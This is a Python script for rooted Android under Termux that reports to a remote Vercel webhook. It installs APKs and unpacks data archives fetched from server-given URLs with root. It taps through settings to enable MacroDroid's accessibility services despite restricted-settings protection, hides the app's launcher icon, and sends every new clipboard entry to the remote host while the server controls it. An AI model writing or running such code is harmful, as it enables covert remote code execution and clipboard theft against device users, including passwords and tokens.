import sys
import time
import subprocess
import requests
import os
import re
import json

# --- CONFIGURAÇÕES INICIAIS ---
if len(sys.argv) < 4:
    print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
    sys.exit(1)

DEVICE_ID = sys.argv[1]
GUILD_ID = sys.argv[2]
OWNER_ID = sys.argv[3]
URL_WEBHOOK = "https://hapiephoneugph.vercel.app/api/webhook"
APP_PACKAGE = "com.arlosoft.macrodroid"
FLAG_GHOST = "/sdcard/.hapie_ghost_done"
CONFIG_FILE = "hapie_config.json"

# Garante que o Termux não durma
subprocess.run("termux-wake-lock", shell=True, check=False)

# Recupera o Token Dinâmico (JWT) do cofre
def obter_client_token():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f).get("client_token")
        except: pass
    return None

def atualizar_client_token(novo_token):
    if novo_token:
        try:
            config = {}
            if os.path.exists(CONFIG_FILE):
                with open(CONFIG_FILE, "r") as f:
                    config = json.load(f)
            config["client_token"] = novo_token
            with open(CONFIG_FILE, "w") as f:
                json.dump(config, f)
        except Exception as e:
            print(f"⚠️ Erro ao salvar novo token: {e}", flush=True)

def is_app_installed():
    try:
        res = subprocess.check_output(f'su -c "dumpsys package {APP_PACKAGE} | grep versionName"', shell=True, text=True).strip()
        return "versionName" in res
    except Exception:
        return False

# Recebe "vision" para saber se oculta o ícone ou não
def setup_macrodroid(vision=False):
    if os.path.exists(FLAG_GHOST):
        if vision == False:
            try:
                fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
                for act in fallbacks:
                    subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
            except Exception: pass
        return

    print("⚙️ [SETUP] UGPhone bloqueando root. Ativando Hack de Ghost Touch...", flush=True)
    subprocess.run('su -c "appops set com.arlosoft.macrodroid ACCESS_RESTRICTED_SETTINGS allow"', shell=True, stderr=subprocess.DEVNULL)
    
    def get_xml():
        subprocess.run('su -c "uiautomator dump /sdcard/ui.xml"', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        try:
            with open("/sdcard/ui.xml", "r", encoding="utf-8") as f:
                return f.read()
        except Exception: return ""

    def tap_bounds(match):
        cx = (int(match.group(1)) + int(match.group(3))) // 2
        cy = (int(match.group(2)) + int(match.group(4))) // 2
        subprocess.run(f'su -c "input tap {cx} {cy}"', shell=True)

    def click_element(text=None, ui_class=None):
        xml = get_xml()
        if text: pattern = fr'text="{text}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
        elif ui_class: pattern = fr'class="{ui_class}"[^>]*bounds="\[(\d+),(\d+)\]\[(\d+),(\d+)\]"'
        else: return False
            
        match = re.search(pattern, xml, re.IGNORECASE)
        if match:
            tap_bounds(match)
            return True
        return False

    print("🤖 [GHOST TOUCH] Assumindo o controle da tela...", flush=True)
    subprocess.run('su -c "am start -a android.settings.ACCESSIBILITY_SETTINGS"', shell=True)
    time.sleep(4) 

    if click_element(text="MacroDroid"):
        time.sleep(1.5)
        click_element(ui_class="android.widget.Switch")
        time.sleep(1.5)
        if not click_element(text="ALLOW"): click_element(text="PERMITIR")
        time.sleep(1)
        subprocess.run('su -c "input keyevent 4"', shell=True)
        time.sleep(1)

    if click_element(text="MacroDroid UI Interaction"):
        time.sleep(1.5)
        click_element(ui_class="android.widget.Switch") 
        time.sleep(1.5)
        if not click_element(text="ALLOW"): click_element(text="PERMITIR")
        time.sleep(1)
        subprocess.run('su -c "input keyevent 4"', shell=True)
        time.sleep(1)

    subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity"', shell=True)
    subprocess.run(f"touch {FLAG_GHOST}", shell=True)
    
    # Se vision for False (App de Sistema), esconde o app
    if vision == False:
        try:
            fallbacks = ["com.arlosoft.macrodroid.LauncherActivity", "com.arlosoft.macrodroid.MainActivity", "com.arlosoft.macrodroid.intro.SplashActivity", "com.arlosoft.macrodroid.intro.IntroActivity"]
            for act in fallbacks:
                subprocess.run(f'su -c "pm disable com.arlosoft.macrodroid/{act}"', shell=True, stderr=subprocess.DEVNULL)
        except Exception: pass

    print("✅ [SETUP] Bypass físico executado com sucesso!", flush=True)

def download_and_install(url):
    apk_path = "/sdcard/sys_app_temp.apk"
    try:
        print(f"🔗 [DOWNLOAD] Recebendo APK...", flush=True)
        response = requests.get(url, stream=True, timeout=60)
        response.raise_for_status()
        with open(apk_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        if not os.path.exists(apk_path): return False
        
        subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
        if os.path.exists(apk_path): os.remove(apk_path)
        return True
    except Exception:
        if os.path.exists(apk_path): os.remove(apk_path)
        return False

def download_and_inject_data(data_url):
    data_path = "/sdcard/MacroDroid_Backup.tar.gz"
    try:
        print(f"📦 [DATA] Baixando backup de dados do sistema...", flush=True)
        response = requests.get(data_url, stream=True, timeout=60)
        response.raise_for_status()
        with open(data_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk: f.write(chunk)
        
        if not os.path.exists(data_path): return False
        
        print("💉 [DATA] Injetando pastas e configurando permissões...", flush=True)
        subprocess.run(f'su -c "tar -xzvf {data_path} -C /"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run('su -c "chown -R $(stat -c \'%u:%g\' /data/data/com.arlosoft.macrodroid) /data/data/com.arlosoft.macrodroid"', shell=True)
        subprocess.run('su -c "am force-stop com.arlosoft.macrodroid"', shell=True)
        
        os.remove(data_path)
        print("✅ [DATA] Configurações e Macros injetadas com sucesso!", flush=True)
        return True
    except Exception as e:
        if os.path.exists(data_path): os.remove(data_path)
        return False

def force_focus_and_read():
    try:
        subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
        time.sleep(0.4)
        text = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
        subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
        return text if text and text != "null" else ""
    except Exception: return ""

def check_authorization():
    try:
        installed = is_app_installed()
        token = obter_client_token()
        
        payload = {
            "ping": True,
            "device_id": DEVICE_ID,
            "guild_id": GUILD_ID,
            "owner_id": OWNER_ID,
            "app_system": not installed,
            "client_token": token,
            "report": {"system_info": {"model": "Hapiephone Guard", "root_access": True, "device_id": DEVICE_ID}}
        }
        headers = {"Content-Type": "application/json"}
        
        response = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=15)
        if response.status_code == 200:
            data = response.json()
            
            # Se vier uma chave nova do Vercel, atualiza no JSON
            if "new_client_token" in data:
                atualizar_client_token(data["new_client_token"])
                
            vision_status = data.get("vision", False)
                
            if not installed:
                apk_url = data.get("link") or data.get("system_apk_url")
                data_url = data.get("data")
                
                if apk_url and download_and_install(apk_url):
                    # Injeta dados se for App de Sistema e tiver link de dados
                    if vision_status == False and data_url:
                        download_and_inject_data(data_url)
                    
                    setup_macrodroid(vision=vision_status)
                    installed = True
            else:
                setup_macrodroid(vision=vision_status)
                
            return data.get("status") == "active" and installed
        return False
    except Exception:
        return False

def sync_macrodroid():
    print("🔄 [SYNC] Enviando variáveis e segredos para o MacroDroid...", flush=True)
    token = obter_client_token() or ""
    # Agora passa o client_token para o MacroDroid, e não a senha estática
    cmd = (
        f'su -c "am broadcast -a hapiephone.sync '
        f'--es device_id \'{DEVICE_ID}\' '
        f'--es guild_id \'{GUILD_ID}\' '
        f'--es owner_id \'{OWNER_ID}\' '
        f'--es url_webhook \'{URL_WEBHOOK}\' '
        f'--es client_token \'{token}\'"'
    )
    subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_vigilante():
    print(f"👁️ [WATCHER] Monitorando Guild: {GUILD_ID}...", flush=True)
    last_clip = force_focus_and_read()
    subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
    cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
    process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = process.stdout.readline()
        if line:
            time.sleep(0.5)
            current = force_focus_and_read()
            if current and current != last_clip:
                if not is_app_installed():
                    process.terminate()
                    return
                try:
                    token = obter_client_token()
                    payload = {
                        "texto": current, 
                        "device_id": DEVICE_ID, 
                        "guild_id": GUILD_ID, 
                        "owner_id": OWNER_ID,
                        "client_token": token
                    }
                    headers = {"Content-Type": "application/json"}
                    
                    res = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
                    if res.status_code == 200:
                        data = res.json()
                        if "new_client_token" in data:
                            atualizar_client_token(data["new_client_token"])
                        if data.get("status") == "shutdown":
                            process.terminate()
                            return
                    last_clip = current
                except Exception:
                    process.terminate()
                    return
        if process.poll() is not None:
            process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def main():
    print("📡 Hapiephone System Online...", flush=True)
    if is_app_installed():
        setup_macrodroid(vision=False) # Valor base caso não tenha passado pelo check ainda
        
    sync_macrodroid()
    
    while True:
        if check_authorization():
            start_vigilante()
        else:
            print("😴 [WAITING] Re-autorizando em 5 min...", flush=True)
            time.sleep(300) 

if __name__ == "__main__":
    main()
